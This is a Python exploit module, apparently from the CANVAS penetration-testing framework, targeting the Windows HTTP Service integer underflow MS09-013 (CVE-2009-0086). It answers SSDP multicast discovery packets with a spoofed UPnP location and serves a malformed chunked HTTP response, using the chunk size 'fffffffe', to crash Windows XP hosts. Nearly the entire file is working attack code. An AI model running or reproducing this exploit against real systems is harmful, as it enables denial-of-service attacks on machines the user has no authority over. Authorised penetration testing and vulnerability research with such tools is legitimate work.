#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='Windows HTTP Service Integer Underflow'
DESCRIPTION='Windows HTTP Service Integer Underflow'

VERSION='1.0'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='04/14/09'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS09-013.mspx'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name']='CVE-2009-0086'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0086'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['NOTES']="Target doesn't matter since we are replying to SSDP Multicast packets. The specified Port is the port the HTTP listener will listen on"

PROPERTY={}
PROPERTY['TYPE']='DoS'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']
PROPERTY['MSADV']='MS09-013'

NOTES="""
Usage:
"""

CHANGELOG="""
"""

import canvasengine
from threading import Thread

targets={
    0:['Autodetect',0],
    1:['Windows XP (Dos)',0]
}

class ssdpTCPThread(Thread):
    def __init__(self,exploit):
        Thread.__init__(self)
        self.exploit=exploit
        self.host=exploit.callback.ip
        self.port=exploit.port
        self.suicide = False
        return

    def run(self):
        s=self.exploit.gettcpsock()
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        try:
            s.bind((self.host,self.port))
            s.listen(5)
        except socket.error,err:
            raise Exception,"Couldn't bind on port %d/tcp: %s"%(self.port,err)
        while self.suicide == False:
            #print 'SSDP TCP Thread (%s)'%(self.exploit.state)
            try:
                client,address=s.accept()
                self.exploit.log('SSDP TCP connection from %s:%d'%(address))
                request=client.recv(1024)
                print repr(request)
                response=''
                response+='HTTP/1.1 200 OK\r\n'
                response+='Content-Type: text/plain\r\n'
                response+='Transfer-Encoding: chunked\r\n\r\n'
                response+='23\r\n'
                response+='This is the data in the first chunk\r\n'
                response+='fffffffe\r\n'
                response+='and this is the second one\r\n'
                response+='0\r\n'
                client.send(response)
            except timeoutsocket.Timeout:
                #self.exploit.log('SSDP server timed out without a connection')
                pass
        s.close()
        return
    
    def killme(self):
        os._exit(0)

class ssdpUDPThread(Thread):
    def __init__(self,exploit,url):
        Thread.__init__(self)
        self.exploit=exploit
        self.host=exploit.callback.ip
        self.port=1900 #not much choice here
        self.url=url
        self.suicide = False
        return

    def run(self):
        s=self.exploit.getudpsock()
        #Bunch of socket options needed to listen for MULTICAST packets
        s.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST,1)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.setsockopt(socket.SOL_IP,socket.IP_MULTICAST_IF,socket.inet_aton(self.host))
        s.setsockopt(socket.SOL_IP,socket.IP_ADD_MEMBERSHIP,struct.pack('4sl',socket.inet_aton('239.255.255.250'),socket.INADDR_ANY))
        try:
            s.bind(('',self.port))
        except socket.error,err:
            raise Exception,"Couldn't bind on port %d/udp: %s"%(self.port,err)
        while self.suicide == False:
            #print 'SSDP UDP Thread (%s)'%(self.exploit.state)
            try:
                request,address=s.recvfrom(1024)
                self.exploit.log('SSDP UDP connection from %s:%d'%(address))
                print repr(request)
                st=''
                i=request.index('ST:')
                if i!=-1:
                    st=request[i+3:]
                i=st.index('\r\n')
                if i!=-1:
                    st=st[:i]
                if st=='':
                    st='upnp:rootdevice'
                print 'ST=%s'%(st)	
                #request is something like:
                #'M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\nMan:"ssdp:discover"\r\nMX:3\r\n\r\n'
                #TODO: parse it instead of replying blindly
                response=''
                response+='HTTP/1.1 200 OK\r\n'
                response+='Cache-Control:max-age=60\r\n'
                response+='Server:CANVAS UPnP/1.0\r\n'
                response+='Location:%s\r\n'%(self.url)
                response+='ST:%s\r\n'%(st)
                response+='USN:uuid:00000000-0000-0000-0000-000000000000::%s\r\n'%(st)
                response+='Ext:\r\n'
                response+='\r\n'
                s.sendto(response,address)
            except timeoutsocket.Timeout:
                #self.exploit.log('SSDP server timed out without a connection')
                pass
        s.close()
        return
    
    def killme(self):
        os._exit(0)

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port=3700
        self.host=''
        self.shellcode=''
        self.badstring='\0'
        self.version=1
        self.name=NAME        
        self.needsNoShellcode=1
        self.threads=[]
        self.autoFind = False
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def test(self):
        return 1
    
    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))        
        return 
    
    def run(self):
        self.getargs()        
        self.setInfo('%s attacking %s:%d (in progress)'%(NAME,self.host,self.port))
        t=ssdpUDPThread(self,'http://%s:%d/upnp/canvas.xml'%(self.callback.ip,self.port))
        t.start()
        self.threads+=[t]
        t=ssdpTCPThread(self)
        t.start()
        self.threads+=[t]
        while self.state != self.HALT:
            continue
        # suicide threads
        for t in self.threads:
            t.suicide = True
            t.join()
            self.log("[+] Child thread terminated")
        return 1

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i=i+1

    def usage(self):
        print 'Usage: %s -v version -t host\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app=theexploit()
    try:
        ret=standard_callback_commandline(app)
    except KeyboardInterrupt:
        # force clean tear down of lingering threads
        for t in app.threads:
            t.killme()            
    if ret not in [0,1,None]:
        ret.interact()
